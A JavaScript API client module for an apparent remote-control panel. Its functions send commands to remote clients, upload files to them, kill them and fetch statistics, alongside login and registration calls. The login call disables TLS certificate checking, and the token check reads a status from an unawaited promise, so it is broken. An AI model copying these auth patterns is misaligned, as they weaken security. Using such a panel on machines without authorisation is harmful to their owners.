import axios from "../axios";

export const logout = async () => {
    const result = await axios({
        method: 'get',
        url: '/api/logout',
        withCredentials: true
    });
    return result.status === 200;
}

export const login = async (values) => {
    const result = await axios({
        method: 'post',
        url: '/web/login',
        data: {
            username: values.username,
            password: values.password,
        },
        withCredentials: true,
        rejectUnauthorized: false
    }).catch(err => {
        return err
    });
    return result.status === 200;
}

export const register = async (values) => {
    const result = await axios({
        method: 'post',
        url: '/web/register',
        data: {
            username: values.username,
            password: values.password,
        },
        withCredentials: true
    });
    return result.status === 200;
}

export const sendCommand = async (clientId, command) => {
    const result = await axios({
        method: 'post',
        url: "/api/commands/add",
        data: {
            client_id: clientId,
            command: command
        },
        withCredentials: true
    });
    return result.status === 200;
}

export const uploadFile = async (formData, clientId) => {
    const result = await axios.post("/api/commands/upload", formData, {
        headers: {
            "client_id": clientId,
            "Content-Type": "multipart/form-data",
        },
        withCredentials: true
    }).then().catch(err => err);
    return result.status === 200;
}

export const killClient = async (clientId) => {
    const result = await axios({
        method: 'post',
        url: "/api/clients/kill",
        data: {
            client_id: clientId,
        },
        withCredentials: true
    });
    return result.status === 200;
}

export const checkToken = () => {
    const result = axios({
        method: 'get',
        url: "/web/auth",
        withCredentials: true
    });
    return result.status === 200;
}

export const getStatistics = async () => {
    const statistics = await axios({
        method: 'get',
        url: "/api/clients/statistics",
        withCredentials: true
    });
    return statistics
}